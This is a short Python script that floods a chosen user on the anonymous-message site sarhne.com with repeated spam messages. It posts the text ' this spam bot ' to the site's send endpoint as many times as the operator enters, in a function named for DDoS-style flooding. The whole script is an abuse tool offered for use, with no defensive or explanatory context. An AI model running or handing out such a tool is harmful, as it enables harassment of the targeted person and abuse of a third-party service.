import requests
import threading
url = "https://www.sarhne.com/ajax/messages/send.html"
id = ""
def post():
   #msg=this+test+all+opppp&show_my_info=on&img_code=&link=103961398130919630158&bad_words=false&i=null
    myobj = {'msg': ' this spam bot ',  #this the msg
    'show_my_info':'on',
    'img_code':'',
    'link':str(id),  #id of user
    'bad_words':'false',
    'i':'null'
    }
    x = requests.post(url, data = myobj)

  
    print(x.text)

def start(ddos):
    threads = []
    for i in range(ddos):
        t=threading.Thread(target=post())
        t.daemon = True 
        threads.append(t)

    for i in range(ddos):
        threads[i].start()

    for i in range(ddos):
        threads[i].join()


id = input('Enter ID : ')
sp = int(input("Enter Spam Number : "))
start(sp)

    

